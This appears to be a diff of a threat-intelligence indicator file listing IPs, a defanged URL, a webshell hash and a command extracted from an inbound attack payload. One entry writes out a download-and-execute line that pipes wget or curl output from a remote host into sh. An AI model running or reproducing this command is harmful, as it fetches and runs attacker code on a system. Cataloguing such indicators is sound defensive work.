@@ -1,17 +1,5 @@
 [
   {
-    "context": "Embedded IP in inbound payload",
-    "source": "static_analysis",
-    "type": "ip",
-    "value": "14.46.136.XXX"
-  },
-  {
-    "context": "Embedded IP in inbound payload",
-    "source": "static_analysis",
-    "type": "ip",
-    "value": "190.179.160.XXX"
-  },
-  {
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
@@ -24,16 +12,28 @@
     "value": "hxxps://14.46.136.XXX/sh)"
   },
   {
-    "context": "Inbound payload hash (webshell)",
+    "context": "Embedded IP in inbound payload",
     "source": "static_analysis",
-    "type": "hash",
-    "value": "a753825d5df56465b2f4d8d55bd2558427157cca73ad49520e3275fa6468ad55"
+    "type": "ip",
+    "value": "14.46.136.XXX"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "190.179.160.XXX"
   },
   {
     "context": "Suspicious command in inbound payload",
     "source": "strings",
     "type": "command",
     "value": "(wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh || curl -sk hxxps://14.46.136.XXX/sh) | sh -s apache.selfrepPOS"
+  },
+  {
+    "context": "Inbound payload hash (webshell)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "a753825d5df56465b2f4d8d55bd2558427157cca73ad49520e3275fa6468ad55"
   },
   {
     "asn": "DigitalOcean, LLC",
